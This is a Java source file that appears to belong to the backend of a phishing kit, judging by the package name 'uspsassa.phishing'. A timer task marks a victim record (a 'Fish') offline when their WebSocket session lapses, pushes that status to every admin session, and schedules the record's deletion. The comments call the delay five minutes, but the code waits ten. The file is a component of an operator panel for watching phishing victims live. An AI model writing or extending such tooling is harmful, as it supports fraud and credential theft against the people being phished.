package com.uspsassa.phishing.timer;

import cn.hutool.core.convert.Convert;
import cn.hutool.extra.spring.SpringUtil;
import com.uspsassa.phishing.common.sresukt.SResult;
import com.uspsassa.phishing.common.sresukt.SResultCode;
import com.uspsassa.phishing.entity.Fish;
import com.uspsassa.phishing.service.FishService;
import com.uspsassa.phishing.socket.WebSocketServer;
import com.uspsassa.phishing.vo.FishVo;

import java.io.IOException;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class UserOnlineTimer extends TimerTask {
    WebSocketServer webSocketServer;

    public UserOnlineTimer(WebSocketServer webSocketServer) {
        this.webSocketServer = webSocketServer;
    }

    @Override
    public void run() {
        //判断是否登录
        System.out.println("执行离线操作");
        webSocketServer.isLogin=false;
        //定时删除
        UserDeleteTimer deleteFishTimer = new UserDeleteTimer(webSocketServer);
        Timer timer = new Timer();
        Fish fish = new Fish();
        fish.setSid(webSocketServer.sid);
        Fish byAll = SpringUtil.getBean(FishService.class).findOneByAll(fish);
        if (byAll == null) {
            webSocketServer.userOnlineTimer = null;
            return;
        }
        FishVo fishVo = Convert.convert(FishVo.class, byAll);
        fishVo.setIsOnline(false);
        try {
            WebSocketServer.sendAllAdmin(SResult.success(SResultCode.OFF,fishVo));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println("定时五分钟删除开启");
        //定时五分钟
        timer.schedule(deleteFishTimer, 1000*600);
        //执行完就删除自己啦
        webSocketServer.userOnlineTimer = null;
        webSocketServer.deleteFishTimer = deleteFishTimer;
    }
}
